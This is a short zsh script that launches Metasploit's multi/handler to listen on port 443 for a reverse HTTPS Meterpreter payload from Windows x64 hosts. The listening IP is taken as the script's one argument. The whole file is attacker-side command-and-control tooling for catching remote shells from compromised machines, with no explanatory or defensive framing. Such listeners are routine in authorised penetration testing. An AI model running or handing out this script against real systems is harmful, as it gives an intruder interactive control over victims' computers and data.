#!/usr/bin/zsh
if [[ $# -ne 1 ]]; then
    echo "ERR: Need one argument"
    echo "Usage: $0 <source IP>"
    exit 2
fi
echo "Initiating... please wait"
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_winhttps; set LPORT 443; set LHOST $1; run; exit";
